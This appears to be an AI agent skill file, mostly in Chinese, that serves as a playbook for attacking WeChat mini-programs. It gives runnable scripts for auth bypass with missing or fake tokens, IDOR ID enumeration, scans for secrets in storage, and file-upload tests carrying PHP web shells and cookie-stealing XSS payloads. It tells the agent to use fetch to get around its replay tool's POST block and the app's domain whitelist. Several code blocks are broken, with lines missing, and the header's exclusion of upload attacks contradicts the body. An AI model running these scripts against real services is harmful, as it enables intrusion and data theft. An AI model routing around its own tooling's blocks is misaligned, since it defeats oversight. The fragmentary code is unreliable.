---
name: miniapp-security-core
description: Use when reviewing authorized WeChat mini-program or mini-app targets for authentication bypass, IDOR, undefined-path access, API abuse, decryption and signature analysis, runtime reverse engineering, route mapping, and sensitive data exposure, with file-submission attack surfaces intentionally excluded.
---

## ❌ 红线（违反即失败）

1. **未完整复述 Checklist** 就调用 MCP 工具
2. **自动重放支付、退款、提现、下单等资金类接口**（`build_replay_plan` 只生成计划，不自动发送）
3. **未经 `dryRun=false` 和 `requireConfirm=true` 就修改 Vuex state**
4. **把解密结果用于绕过服务端校验而非安全评估**

---

## ⚠️ 授权声明（必读）

> **本 skill 仅用于已获授权的安全评估、CTF 竞赛、合法渗透测试和防御性安全研究。**
> **目标小程序须为授权评估对象。禁止对未授权系统使用任何主动探测手段。使用者须自行承担法律责任。**

---

## 评估流程总览

| Phase | 目标 | 核心工具 | 输出 |
|-------|------|---------|------|
| 0. 环境搭建 | CDP 连接 + Hook 注入 | `connection_ops` / `network_ops` | 流量采集就绪 |
| 1. 侦察 | 路由 + 接口资产盘点 | `runtime_ops` / `debugger_ops` | 接口清单（含路由标注）|
| 2. 渗透线索 | IDOR / 认证绕过 / 资金接口 | `analysis_ops` / `runtime_ops(fetch)` | 风险候选清单 |
| 3. 解密分析 | 加密参数破解 + 密钥追踪 | `decrypt_ops` / `debugger_ops` | 明文数据 |
| 4. 逆向审计 | 代码保护分析 + 硬编码凭据扫描 | `debugger_ops` / `reverse_ops` | 凭据泄露报告 |
| 5. State 检查 | Vuex 越权状态验证 | `runtime_ops` | 越权路径 |
| 6. 报告导出 | Markdown 安全评估报告 | `analysis_ops` | 完整报告 |

> **最小可行扫描（时间受限时）**：Phase 0 → Phase 1（全路由）→ Phase 2.1-2.2.1（认证/IDOR/undefined路径）→ Phase 2.5.1（专项风险：JWT-in-URL/静态sign/enc/多appId）→ Phase 2.8（HTTP 行为变化矩阵：传统登录/上传/CVE路径/路由参数）→ Phase 4.7 第一轮（CRITICAL 凭据扫描）→ Phase 6

---

## 快速决策树（从目标直达 Phase）

```
当前任务是什么？
│
├─ 刚拿到小程序，需要全面摸底
│   └─ 走完整流程：Phase 0 → 1 → 2 → 4.7 → 6
│
├─ 时间有限，只测高价值面
│   └─ 最小可行扫描：0 → 1 → 2.1 + 2.2 + 2.2.1 → 2.5.1 → 4.7（CRITICAL）→ 6
│
├─ 发现加密参数（mina_edata / sign / enc）需要解密
│   └─ Phase 3 解密分析 → 场景 2（AES-CBC）/ 场景 3（唯品会三层）/ 场景 14（cachedata）
│
├─ 发现含 ID 参数的接口，怀疑 IDOR
│   └─ Phase 2.2 主动验证 → Phase 2.2.1（/undefined 路径）→ 场景 5
│
├─ 发现地址 / 订单接口，测写越权
│   └─ Phase 2.4.A（地址越权）/ Phase 2.4.B（订单越权）→ 场景 5
│
├─ 源码有混淆 / JSVMP / Webpack 保护
│   └─ Phase 4.1 识别类型 → Phase 4.2（Webpack）/ 4.3（OB）/ 4.4（JSVMP）→ 场景 7/8
│
├─ 怀疑硬编码了 AK/SK / AppSecret / 数据库密码
│   └─ Phase 4.7.0（运行时优先）→ Phase 4.7.1-4.7.9（正则扫描）→ 场景 11
│
├─ 接口认证疑似可绕过（不带 token 也返回数据）
│   └─ Phase 2.1 认证绕过主动验证 → 判断标准表
│
├─ 看到 /login 全部 404，疑似迁移到 OAuth2
│   └─ Phase 2.8 ① → 场景 16（认证机制迁移探测）
│
└─ 需要生成完整评估报告
    └─ Phase 6 → analysis_ops(generate_security_notes)
```

---

## Phase 0：环境搭建

```
MCP 操作顺序（推荐每次评估开始时执行）：

1. connection_ops(action="connect_wmpf")
   → 连接 WMPFDebugger CDP，默认 ws://127.0.0.1:62000

2. network_ops(action="network_enable")
   → 启用 CDP Network domain，开始采集

3. 注入路由发现脚本 __routeNavigator（必须在 select_appservice_context 之前！）
   ⚠️ 此步骤要使用 runtime_eval（page-frame 上下文），不是 runtime_eval_appservice。
      脚本依赖 window.frames 遍历跨 frame 找到拥有完整 __wxConfig 和 getCurrentPages
      的 appservice frame；若在 appservice 上下文注入则 frames 遍历失效，路由数量仍然不足。

   # Step A: 读取注入脚本内容
   Read(file_path="package/applet_routes/nav_inject.js")
   → 获取 nav_inject.js 全文（约 360 行）

   # Step B: 注入到 page-frame 上下文
   runtime_ops(action="runtime_eval",
               expression="<nav_inject.js 全文内容>",
               await_promise=False)

   # Step C: 验证注入成功
   runtime_ops(action="runtime_eval",
               expression="typeof window.__routeNavigator")
   → 返回 "object" 表示注入成功；返回 "undefined" 则重试 Step B

4. connection_ops(action="select_appservice_context")
   → 自动识别 appservice Runtime context，供后续 runtime_eval_appservice 使用

5. network_ops(action="hook_wx_request")
   → 在 appservice 上下文注入 wx.request hook，采集请求/响应原始数据

6. network_ops(action="hook_fetch_and_xhr")
   → 注入 fetch/XHR hook（Web 端 H5 页面）

7. runtime_ops(action="dump_runtime_snapshot")
   → 当前页面状态快照（URL、路由、存储摘要）
   → 记录当前路由路径，后续所有请求均标注来源路由
```

---

## Phase 1：路由发现与接口侦察

### 1.0 路由资产盘点（v2.10 重写 — 使用 __routeNavigator）

**核心原则：每个请求必须标注来源路由，每条路由都必须被测试。**

> ⚠️ **前提**：Phase 0 Step 3 的 `__routeNavigator` 必须已注入。如果本步骤报错，先确认注入成功。

```
# Step 1: 获取完整路由表（含分包）—— 一次调用取代旧的两步搜索
runtime_ops(action="runtime_eval",
            expression="window.__routeNavigator.fetchConfigJson()")
  → 解析返回 JSON：
    pages        = [{route, source, isTabBar}, ...]   → 含主包 + 所有分包路由
    tabBarPages  = ["pages/home/index", ...]
    currentRoute = "pages/xxx/xxx"                    → 当前所在页面
    guardEnabled = false

  ⚠️ 若返回 "undefined" 或报错：
     - 检查 Phase 0 Step C 是否返回 "object"
     - 重新执行 Phase 0 Step B（重注入）再重试

# Step 2: 获取当前页面栈（辅助确认路由上下文）
runtime_ops(action="runtime_eval_appservice",
            expression="(()=>{const p=getCurrentPages();return p.map(pg=>({route:pg.route,options:pg.options}))})()")
```

**路由表解读要点：**
- `source="main"` → 主包页面
- `source="subPackageName"` → 对应分包，代表分包已在 `__wxConfig` 中声明
- `isTabBar=true` → 导航时用 `switchTabJson`，否则用 `navigateToJson` 或 `reLaunchJson`
- 若 `pages` 仍然很少（< 5）：说明小程序尚未加载子包配置，先随意触发几次页面切换再重试

### 1.1 逐路由流量采集（优先级优先 — v2.12）

**核心原则：按漏洞价值排序遍历，不要按路由列表顺序机械扫描。**

#### 路由优先级分级

拿到 `fetchConfigJson()` 的完整路由表后，先按以下规则分组再依次测试：

```
P0 — 必测（最高价值，直接对应已知漏洞类型）
  关键词命中任意一个即归入：
  order / pay / payment / cart / checkout / coupon / refund  ← 支付/订单
  address / profile / setting / account / userInfo           ← 个人信息/写越权
  admin / manage / backstage / internal / debug              ← 后台/管理
  borrow / return / renew / reserve                          ← 借阅（图书馆类）
  donate / purchase / buy                                    ← 购买/捐赠

P1 — 重要（常含 IDOR 或认证绕过线索）
  detail / Detail / info / get / query / view                ← ⚡ 详情页（必须配合 ID 参数测试）
  list / search / result / record / history                  ← 列表（可枚举，为 Detail IDOR 提供 ID 来源）
  auth / login / register / bind / verify / openid           ← 认证流程
  mine / my / user / member / reader                         ← 用户中心

P2 — 普通（扫完 P0/P1 后再补）
  index / home / activity / service / navigation             ← 首页/导航
  notice / article / news / video / exhibit / about          ← 内容展示

P3 — 低优先（通常纯展示，无接口）
  agreement / guide / success / result / map / web-view      ← 静态/结果/地图
  demo / live / readNow                                      ← 演示/直播
```

---

#### ⚡ Detail 路由专项协议（P1 必执行）

**核心问题**：Detail 路由不带 ID 参数直接导航通常返回空数据或报错，必须从对应 List 接口获取真实 ID 后再测试。

```
遇到 xxxDetail / xxxInfo / bookDetail / orderDetail / layerDetail 等路由时：

Step 1: 先找 ID 来源
  → 检查已捕获请求中同模块的 list/query 接口响应
  → 从响应 JSON 中提取 id / itemId / orderId / bookId 等字段
  → 若无 list 数据：先导航对应 list 路由触发数据加载，再读取 ID

Step 2: 带 ID 导航 Detail 路由
  → 方式 A（url 参数）：reLaunchJson('pages-sub/xxx/detail?id=<真实ID>')
  → 方式 B（onLoad 注入）：navigateToJson 后用 runtime_eval_appservice 调用
      page.onLoad({id: '<真实ID>'})

Step 3: 读取 Detail 接口请求，确认接口路径和 ID 参数名

Step 4: 立即执行 IDOR 测试（Phase 2.2 模板）
  → 用当前用户 ID 作为 BASELINE
  → 从 list 响应中找其他用户的 ID（如社区帖子作者、排行榜 userId）
  → 对比响应数据差异判断越权
  → 空数据 ≠ 无 IDOR（换有真实数据的 ID 重试）
```

**典型 Detail 路由来源配对表：**

| Detail 路由关键词 | 对应 List 路由 | ID 字段名 |
|-----------------|--------------|---------|
| orderDetail / order/detail | order/list / my-order/index | id / orderId |
| bookDetail / book-detail | booklist / borrow/list | id / bookId / isbn |
| layofficeDetail / layerDetail | legalServices/list | id |
| articleDetail / docDetail | article-list / continuous | id / articleId |
| myActivity/detail | myActivity/myActivity | id / activityId |
| exhibitList/index / electronic-detail | exhibitList / electronic-list | id |

---

```

runtime_eval_appservice(expression="(()=>{
      var route=(getCurrentPages().slice(-1)[0]||{}).route||'?';
        form:JSON.stringify(obj.formData||{}),route:route,ts:Date.now()});
      return origUp.apply(this,arguments);
    };
  }
})()")

  → 有条目 → 直接跳 Step 4 执行绕过测试
  → 无条目 → 执行 Step 3「主动触发法」

Step 3: 主动触发法（Hook 无日志时执行）

runtime_eval_appservice(expression="(async ()=>{
  var pages=getCurrentPages();
  var c=pages[pages.length-1];

  // Step 3a: 列出所有页面方法，找潜在的上传触发入口
  var methods=Object.keys(c).filter(function(k){return typeof c[k]==='function';});

      form:JSON.stringify(obj.formData||{}),route:c.route,ts:Date.now()});
    return origUp.apply(this,arguments);  // 继续真正上传
  };
    // 创建一个模拟图片文件
    var fs=wx.getFileSystemManager();
    var p=wx.env.USER_DATA_PATH+'/probe_trigger.jpg';
    try{fs.writeFileSync(p,'GIF89aFAKE','utf8');}catch(e){}
    if(opts&&typeof opts.success==='function')
      opts.success({tempFilePaths:[p],tempFiles:[{path:p,size:9}]});
  };
    var fs=wx.getFileSystemManager();
    var p=wx.env.USER_DATA_PATH+'/probe_trigger.jpg';
    try{fs.writeFileSync(p,'GIF89aFAKE','utf8');}catch(e){}
    if(opts&&typeof opts.success==='function')
      opts.success({tempFiles:[{tempFilePath:p,fileType:'image',size:9}]});
  };

  // Step 3c: 逐一调用页面 handler，用 fake tap event 触发，监控哪个触发了上传
  var fakeEvent={type:'tap',timeStamp:Date.now(),
    target:{id:'',dataset:{},offsetLeft:0,offsetTop:0},
    currentTarget:{id:'',dataset:{},offsetLeft:0,offsetTop:0},
    touches:[{identifier:0,pageX:100,pageY:100,clientX:100,clientY:100}],
    changedTouches:[{identifier:0,pageX:100,pageY:100}],
    detail:{x:100,y:100}};
  var triggeredBy=null;
  for(var m of methods){
    try{c[m].call(c,fakeEvent);}catch(e){}
    await new Promise(function(r){setTimeout(r,500);});
      triggeredBy=m;
      break;
    }
  }

  // 恢复

  return JSON.stringify({
    methods:methods,
    triggeredBy:triggeredBy,
  });
})()")

  → 若所有方法均未触发：
        runtime_eval_appservice("JSON.stringify(getCurrentPages().slice(-1)[0].data)")
      - 从 get_all_requests / DNS prefetch 反推 OSS 域名
      - 从 Storage 搜索 ossInfo / accessKeyId 字段

Step 4: 对捕获的上传 URL 执行完整文件类型绕过测试

runtime_eval_appservice(expression="(async ()=>{
  var token=wx.getStorageSync('token')||wx.getStorageSync('access_token')||'';
  var fs=wx.getFileSystemManager();
  var base=wx.env.USER_DATA_PATH;
  var tests=[
    {label:'baseline_jpg',  fn:'ok.jpg',         mime:'image/jpeg',      body:'\\xff\\xd8\\xff\\xe0normal'},
    {label:'php_as_jpg',    fn:'shell.php',       mime:'image/jpeg',      body:'<?php phpinfo();?>'},
    {label:'phtml',         fn:'shell.phtml',     mime:'image/jpeg',      body:'<?php system($_GET[\"c\"]);?>'},
    {label:'gif_php',       fn:'shell.gif',       mime:'image/gif',       body:'GIF89a<?php system($_GET[\"c\"]);?>'},
    {label:'double_ext',    fn:'img.php.jpg',     mime:'image/jpeg',      body:'<?php phpinfo();?>'},
    {label:'svg_xss',       fn:'xss.svg',         mime:'image/svg+xml',   body:'<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.cookie)</script></svg>'},
    {label:'html_xss',      fn:'xss.html',        mime:'text/plain',      body:'<script>alert(document.cookie)</script>'},
  ];
  var results=[];
  for(var t of tests){
    fs.writeFileSync(base+'/'+t.fn, t.body, 'utf8');
    var r=await new Promise(function(res){
        header:{'Authorization':'Bearer '+token,token:token},
        formData:{},
        success:function(r){
          var parsed={};try{parsed=JSON.parse(r.data);}catch(e){}
          var fileUrl=(parsed.data&&(parsed.data.url||parsed.data))||parsed.url||'';
          res({label:t.label,file:t.fn,status:r.statusCode,code:parsed.code,
               fileUrl:String(fileUrl),resp:String(r.data).slice(0,300)});
        },
        fail:function(e){res({label:t.label,file:t.fn,status:'fail',err:String(e.errMsg||'').slice(0,80)});}
      });
    });
    results.push(r);
  }
  return JSON.stringify(results,null,2);
})()")

Step 5: 验证 Content-Type 与 Content-Disposition（决定 XSS 是否可利用）

runtime_eval_appservice(expression="(async ()=>{
  var urls={svg:'<svg URL>',html:'<html URL>',php:'<php URL>',pdf:'<pdf URL>'};
  var results=[];
  for(var k in urls){
    var r=await new Promise(function(res){wx.request({
      url:urls[k],method:'GET',
      success:function(r){
        var h=r.header||{};
        res({type:k,status:r.statusCode,
             ct:h['Content-Type']||h['content-type']||'?',
             cd:h['Content-Disposition']||h['content-disposition']||'none（inline！）',
             body:JSON.stringify(r.data||'').slice(0,150)});
      },fail:function(e){res({type:k,status:'fail'});}
    })});
    results.push(r);
  }
  return JSON.stringify(results,null,2);
})()")

Step 6: 判断结果
  .svg + ct=image/svg+xml  + cd=none → 🔴 浏览器 inline 执行 → Stored XSS 确认
  .html + ct=text/html     + cd=none → 🔴 浏览器 inline 执行 → Stored XSS 确认
  .php 上传成功 + cd=none            → ⚠️ OSS 不执行 PHP，但无扩展名检查
  任意文件 + cd=attachment           → ✅ 强制下载，XSS 不可直接触发
  服务端拒绝"格式不支持"            → ✅ 白名单保护
```

---

#### 遍历流程

```
Step 1: 从 fetchConfigJson() 路由表按上面规则分组为 P0/P1/P2/P3

Step 2: 按 P0 → P1 → P2 → P3 顺序依次导航，每个路由：

For each route in [P0, P1, P2, P3 顺序]:
  ┌──────────────────────────────────────────────────────────┐
  │ 路由: pages-sub/borrow/my-order/index  (P0)               │
  │   1. 导航（统一优先 reLaunchJson）：                        │
  │        runtime_eval("window.__routeNavigator             │
  │                       .reLaunchJson('pages-sub/...')")   │
  │   2. 触发刷新（onPullDownRefresh 或 onShow）               │
  │   3. 读取新增请求                                          │
  │   4. ⚡ 空流量路由？→ 按决策树处理（最多重试 2 次）           │
  │   5. 路由类型专项处理：                                     │
  │      · detail/Detail 类     → 执行 Detail ID 协议          │
  │      · order/pay/address 类 → 标记认证绕过/IDOR 候选        │
  │   6. 记录: URL / 方法 / 参数 / 认证 / 加密，标注来源路由     │
  └──────────────────────────────────────────────────────────┘

Step 3: P0 路由采集完成后，立即执行 Phase 2 渗透验证
        P1/P2/P3 继续在后台补充遍历
```

#### ⚡ 空流量路由决策树

```
导航后无新请求？
│
├─ YES → 尝试强制刷新（onPullDownRefresh / onShow）
│    ├─ 有新请求 → 正常采集
│    └─ 仍无请求（重试 2 次）→ 判定为静态/纯UI路由
│         → 记录"[无接口 — 跳过]"，进入下一条路由
│         ← ⚠️ 最多重试 2 次，不要死磕
│
└─ NO → 正常采集
```

> **静态路由常见特征**：协议/关于/引导/成功页、地图、web-view 包装页。

**路由请求标注格式（在分析和报告中均使用）：**

```
路由: pages-sub/borrow/my-order/detail  [P1 — Detail — 已从 list 提取 ID]
  └── GET  /api/borrow/order/detail?id=123  [认证: token]
       风险标签: IDOR 已验证 / 他人订单数据可读

       风险标签: 文件类型绕过已测 / .php 上传成功 → RCE

路由: pages-sub/profile/address-list  [P0 — 地址]
  ├── GET  /api/user/address/list            [认证: token]
  └── POST /api/user/address/add             [认证: token]
       风险标签: 地址写越权候选

路由: pages-sub/mine/agreement  [P3 — 静态]
  └── [无接口 — 纯展示，跳过]
```
### 1.2 全量流量汇总

在完成所有路由的遍历采集后：

```
network_ops(action="get_all_requests")
  → 返回 CDP + wx.request + fetch/XHR 归一化请求列表（含来源路由标注）

analysis_ops(action="get_api_inventory")
  → 返回去重后的接口清单：路径、方法、状态码、参数、认证字段、来源路由、风险标签

analysis_ops(action="generate_api_table_markdown")
  → Markdown 接口表格（按路由分组）
```

### 1.3 加密参数识别

```
network_ops(action="search_runtime_keywords",
            keywords=["mina_edata", "encrypt", "AES", "3DES", "sign", "token", "cipher"])
  → 在 window、document、storage 和内联脚本中搜索关键词

network_ops(action="inspect_wx_config")
  → 检查 __wxConfig、__wxAppCode__ 中的关键词命中

decrypt_ops(action="auto_detect_encoding", value="<加密参数值>")
  → 自动识别编码类型（base64 / hex / url_encoded）
```

### 1.4 脚本分析

```
debugger_ops(action="list_scripts")
  → 列出已加载脚本

debugger_ops(action="search_in_sources", query="encrypt|AES|sign|request|decrypt|crypto|md5|sha|base64")
  → 全源码搜索加密/签名关键词

debugger_ops(action="get_script_source", url="<脚本URL>")
  → 获取脚本内容

# v2.0 新增：检测代码保护
debugger_ops(action="search_in_sources", query="_0x|obfuscator|jsvmp|virtualMachine|while.*switch|webpackJsonp")
  → 识别混淆/JSVMP/Webpack 打包
```

> ⚠️ **cachedata 脚本降级方案（v2.5 新增）**：若 `list_scripts` 返回的 URL 全部以 `.cachedata` 结尾，或 `search_in_sources` 对所有查询均返回 0 命中，或 `get_script_source` 报 `"Debugger agent is not enabled"`，说明脚本以 WX 二进制缓存格式存储，静态文本搜索完全失效。此时切换到**运行时扫描**替代方案：
>
> ```
> # 替代方案1: 运行时遍历全局函数名，定位加密函数
> runtime_ops(action="runtime_eval",
>   expression="(()=>Object.keys(globalThis).filter(k=>typeof globalThis[k]==='function'&&
>     /encrypt|decrypt|sign|md5|sha|aes|des|hmac|cipher|encode/i.test(k)))()")
>
> # 替代方案2: 扫描全局变量中的硬编码密钥（见 Phase 4.7.2 的验证步骤 1-4）
> runtime_ops(action="runtime_eval",
>   expression="(()=>{var r={};for(var k of Object.keys(globalThis||window||{})){
>     if(/host|gateway|env|config|api|baseUrl|key|secret|token/i.test(k)){
>       try{var v=String(globalThis[k]);if(v&&v!='undefined')r[k]=v.slice(0,200)}catch(e){}
>     }}return JSON.stringify(r)})()")
>
> # 替代方案3: 搜索 Storage 中的密钥字段
> runtime_ops(action="runtime_eval",
>   expression="(()=>{try{var keys=wx.getStorageInfoSync().keys;
>     var r={};keys.filter(k=>/key|token|secret|sign|iv|crypto|aes|des/i.test(k))
>     .forEach(k=>{try{r[k]=wx.getStorageSync(k)}catch(e){}});return JSON.stringify(r)}
>     catch(e){return String(e)}})()")
> ```

---

## Phase 2：渗透测试线索分析

### 2.1 认证与授权测试（主动验证）

```
analysis_ops(action="analyze_auth_surface")
  → 认证字段分布、token 位置（header/query/body）、缺少认证的敏感接口
  → 按路由分组展示，标注每个路由的认证覆盖盲区
```

**认证绕过必须主动发送请求验证，不能只看静态分析结果：**

```
# Step 1: 从 get_request_detail 提取目标请求的完整信息
# Step 2: 用 runtime_eval (fetch) 或 runtime_eval_appservice (wx.request) 主动发送修改后的请求
# Step 3: 对比响应判断是否绕过

# === 认证绕过主动测试模板 ===
runtime_ops(action="runtime_eval", expression="(async ()=>{
  var token='<从JWT解析或请求中提取的token>';
  var url='<目标接口URL>';
  var method='<GET/POST>';
  var body='<原始请求体JSON>';

  var results=[];
  // 测试1: 不带 token
  var r1=await fetch(url,{method:method,headers:{'Content-Type':'application/json'},body:body});
  results.push({test:'no_token',status:r1.status,body:await r1.text()});

  // 测试2: 带空 token
  var r2=await fetch(url,{method:method,headers:{'Authorization':'Bearer ','Content-Type':'application/json'},body:body});
  results.push({test:'empty_token',status:r2.status,body:await r2.text()});

  // 测试3: 带伪造 token
  var r3=await fetch(url,{method:method,headers:{'Authorization':'Bearer fake_token_12345','Content-Type':'application/json'},body:body});
  results.push({test:'fake_token',status:r3.status,body:await r3.text()});

  // 测试4: 正常 token（基线）
  var r4=await fetch(url,{method:method,headers:{'Authorization':'Bearer '+token,'Content-Type':'application/json'},body:body});
  results.push({test:'baseline',status:r4.status,body:await r4.text()});

  return JSON.stringify(results,null,2);
})()")

# === 认证绕过判断标准 ===
# no_token 返回 200 + 正常数据 → 🔴 无认证保护（严重）
# empty_token 返回 200 + 正常数据 → 🔴 token 验证不严格
# fake_token 返回 200 + 正常数据 → 🔴 token 未真正校验
# baseline 返回 200，其余返回 401/403 → ✅ 认证正常
# 所有测试返回相同数据 → 🔴 接口根本不需要认证
#
# ⚠️ 歧义情况：所有测试（含 baseline）均返回相同 500 →
#    不等于"未保护"！服务端可能在解析 token 时崩溃。
#    判断方法：检查 500 响应体是否包含堆栈/debug 信息（信息泄露）。
#    后续操作：换有效 token（从 storage 或 JWT 解码获取）构造 baseline 再测。
```

**为什么用 `runtime_eval` + `fetch` 而非 `replay_ops`：**
- `replay_ops` 对 POST/写操作默认阻断（`blocked_by_policy`）
- `fetch` 从 webview 层面发送，绕过小程序的域名白名单限制
- 直接拿到响应数据对比，无需手动验证

### 2.2 IDOR 候选发现与主动验证

```
analysis_ops(action="find_idor_candidates")
  → 包含对象 ID 的接口（潜在 IDOR 候选）
  → 标注: 来源路由 + ID 参数名称 + ID 格式（自增/UUID/编码）
```

**IDOR 不能只看静态分析结果，必须主动发送请求验证。以下为完整主动测试流程：**

```
# Step 1: 获取原始请求详情
network_ops(action="get_request_detail", request_id="<候选请求ID>")
  → 提取: url, method, headers, body, 响应结构

# Step 2: 从 JWT/Body 中识别当前用户 ID
# 如果 Authorization header 是 JWT，解码 payload 获取 userId
# 如果请求体中有 openId/userId/uuid，记录当前值

# Step 3: 构造 IDOR 测试向量并主动发送
# 使用 runtime_eval (fetch) 绕过 replay_ops 的 POST 阻断
runtime_ops(action="runtime_eval", expression="(async ()=>{
  var token='<从请求中提取的完整token>';
  var baseBody=<原始请求体JSON>;

  var tests=[
    {label:'BASELINE',body:{...baseBody}},                        // null/原值（基线）
    {label:'IDOR_ADJACENT',body:{...baseBody,userId:baseBody.userId+1}}, // 相邻ID
    {label:'IDOR_FIRST',body:{...baseBody,userId:1}},             // 首个用户
    {label:'IDOR_ZERO',body:{...baseBody,userId:0}},              // 边界值
    {label:'IDOR_STRING',body:{...baseBody,userId:'admin'}},      // 类型混淆
  ];

  var results=[];
  for(var t of tests){
    var r=await fetch('<目标URL>',{
      method:'POST',
      headers:{'Authorization':'Bearer '+token,'Content-Type':'application/json'},
      body:JSON.stringify(t.body)
    });
    var text=await r.text();
    results.push({label:t.label,status:r.status,bodyLen:text.length,preview:text.slice(0,500)});
  }
  return JSON.stringify(results,null,2);
})()")
```

**IDOR 判断标准（按优先级）：**

| 响应对比 | 判断 | 后续操作 |
|----------|------|---------|
| BASELINE 有数据，IDOR_* 返回**不同的有效数据** | 🔴 IDOR 确认 | 提取他人数据的敏感程度，定级 |
| BASELINE 有数据，IDOR_* 返回**相同数据** | ✅ 后端忽略了 userId（取 token） | 换参数位置测试 |
| BASELINE 有数据，IDOR_* 返回 403 | ✅ 有权限检查 | 记录为已防御 |
| BASELINE 空数据，IDOR_* 也空数据 | ⚠️ 无法判断 | 说明当前用户/目标用户均无数据，换有数据的接口测试 |
| IDOR_* 返回了不同 `data.phone/name/idCard` 等字段 | 🔴 越权读取他人敏感信息 | 严重，立即报告 |

**跨域请求注意**：如果目标 API 域名与当前小程序不同（如跨小程序调用），`wx.request` 会因域名白名单失败，此时 `fetch` 从 webview 层发送可绕过限制。

### 2.2.1 路径参数 undefined IDOR（v2.4 新增）

**模式：URL 路径中包含 `/undefined` 段**，说明客户端 JS 变量未初始化就直接嵌入了 URL 模板（如 `` `/api/detail/${item.id}` `` 中 `item.id` 为 `undefined`），服务端收到字面字符串 `"undefined"` 后仍可能转发给数据库查询。

```
# Step 1: 从已采集请求中识别路径含 /undefined 的接口
network_ops(action="get_all_requests")
  → 筛选 path.includes('/undefined') 的条目
  → 这类请求常出现在页面刚加载、列表未渲染完成时触发的详情接口

# Step 2: 获取原始请求完整信息
network_ops(action="get_request_detail", request_id="<候选请求ID>")
  → 提取: url, method, headers, 认证字段
```

**主动测试模板（替换 undefined 为数字 ID 枚举资源）：**

```
runtime_ops(action="runtime_eval", expression="(async ()=>{
  var baseUrl='<原始URL，含 /undefined>';
  var method='<GET/POST>';
  var headers={'Content-Type':'application/json','Authorization':'Bearer <token>'};
  var testIds=[1,2,3,10,100,1000,99999];
  var results=[];

  // BASELINE: 原始 /undefined 请求（确认服务端如何处理字面 undefined）
  var rb=await fetch(baseUrl,{method:method,headers:headers});
  var baseText=await rb.text();
  results.push({id:'undefined',status:rb.status,len:baseText.length,preview:baseText.slice(0,300)});

  // 枚举数字 ID — 将路径中的 /undefined 替换为 /<id>
  for(var id of testIds){
    var url=baseUrl.replace('/undefined','/'+ id);
    var r=await fetch(url,{method:method,headers:headers});
    var text=await r.text();
    results.push({id:id,status:r.status,len:text.length,preview:text.slice(0,400)});
  }
  return JSON.stringify(results,null,2);
})()")
```

**如果从响应或其他接口已获得真实 ID（如 exhibitId=42），优先测试相邻范围：**

```
var testIds=[39,40,41,42,43,44,45,1,2,99999];
// 相邻 ID 最容易触发他人数据，危害更直接
```

**判断标准：**

| 响应对比 | 判断 | 后续操作 |
|----------|------|---------|
| `/undefined` 返回空/错误，数字 ID 返回**他人有效数据** | 🔴 路径遍历 IDOR 确认 | 枚举更多 ID，确认数据敏感程度 |
| 不同数字 ID 返回**不同用户**的数据 | 🔴 IDOR 确认（越权访问） | 提取数据字段，按越权范围定级 |
| 数字 ID 返回 404/403/权限错误 | ✅ 有保护 | 记录为已防御 |
| 所有 ID（包括 undefined）均返回相同错误 | ⚠️ 需认证 | 用带有效 token 的请求重测 |
| `/undefined` 与数字 ID 响应**长度不同** | 🔴 服务端区分了不同 ID，存在数据泄露风险 | 检查不同 ID 返回的具体字段 |

### 2.3 敏感数据暴露

```
analysis_ops(action="find_sensitive_data_exposure")
  → 请求/响应中的敏感字段（已脱敏展示）
  → 关注: 手机号、身份证、银行卡号、密码、token 在响应体中回显
  → 按路由分组的敏感数据暴露统计
```

### 2.4 资金类接口识别

```
analysis_ops(action="find_payment_and_order_surfaces")
  → 支付/订单/优惠券/钱包/余额接口（资金风险候选）
  → 标注: 来源路由 + 金额参数名 + HTTP 方法
  → 金额篡改候选: price/amount/cost/total/fee 参数
  → 优惠券/积分: couponId/bonusId/point 参数
```

### 2.4.A 地址管理越权测试（v2.8 新增）

**核心原则：地址接口极易出现 IDOR —— 地址 ID 通常是自增整数，且增删改操作仅凭 token 可能无法校验地址归属。必须自己添加地址拿到 ID，再用该 ID 枚举其他用户地址。**

> ⚠️ **地址接口命名不唯一**：不同小程序的地址 API 路径差异很大，必须从流量中获取真实路径。常见变体：
> - `/api/app/user/address/add` — 用户收货地址
> - `/api/app/delivery/address/add` — 物流配送地址  
> - `/api/app/trade/delivery/add-receiver` — **订单收货人**（含 deliveryIds 关联订单！）
> - `/api/app/address/save` / `/api/app/address/create`
>
> `trade/delivery/add-receiver` 是特殊情况：它的 `deliveryIds` 字段关联了具体订单，
> 这既是地址接口也是订单关联接口，IDOR 价值更高（改变他人订单的收货人）。

#### Step 1：导航地址页采集真实接口

```javascript
// 导航到地址管理页（按实际路由名）
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{wx.navigateTo({url:'/pages-sub/address/address'});return 'ok'})()")
// 也导航到订单详情页（通常含收货地址修改）
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{wx.navigateTo({url:'/pages/editDelivery/editDelivery'});return 'ok'})()")
// 等 2 秒后查看接口清单，找到 address/delivery/receiver 相关 GET/POST/PUT/DELETE
analysis_ops(action="get_api_inventory")
→ 识别: address/list, address/add, address/get, address/edit, address/delete
→ 特别关注: delivery/add-receiver / delivery/address/add 等含 deliveryIds/receiverId 的接口
```

#### Step 2：主动添加测试地址（获取 addressId / deliveryId）

```javascript
runtime_ops(action="runtime_eval_appservice", expression="(async ()=>{
  var token=wx.getStorageSync('TOKEN')||wx.getStorageSync('token');
  var base='https://<API域名>';
  var ts=Date.now();
  // 尝试常见的地址创建 API 路径（从接口清单中取真实路径）
  var addPaths=[
    '/api/app/user/address/add',
    '/api/app/address/add',
    '/api/app/delivery/address/add',
    '/lyanxue/api/v1.2/app/delivery/address/add',
    '/lyanxue/api/v1.2/app/user/address/add',
  ];
  var testAddr={
    name:'IDOR测试',
    phone:'13800000001',
    province:'广东省',
    city:'深圳市',
    district:'南山区',
    detail:'测试路1号',
    isDefault:0,
    timestamp:ts
  };
  var results=[];
  for(var p of addPaths){
    var r=await new Promise(res=>{wx.request({
      url:base+p,method:'POST',
      header:{token:token,'Content-Type':'application/json'},
      data:testAddr,
      success:function(r){res({path:p,code:r.data&&r.data.code,msg:r.data&&r.data.msg,
        addrId:r.data&&r.data.data&&(r.data.data.id||r.data.data.addressId||r.data.data.deliveryId),
        preview:JSON.stringify(r.data).slice(0,300)})},
      fail:function(e){res({path:p,status:'fail'})}
    })});
    if(r.code===10000||r.code===200||r.code===0) results.push(r);
    else results.push(r);
  }
  return JSON.stringify(results,null,2);
})()")
→ 记录成功的 path 和返回的 id（通常为整数）
```

#### Step 2.5：针对 trade/delivery/add-receiver 的特殊处理

**`add-receiver` 是订单关联的收货人接口，比普通地址更高价值：**

```javascript
// 真实请求示例：
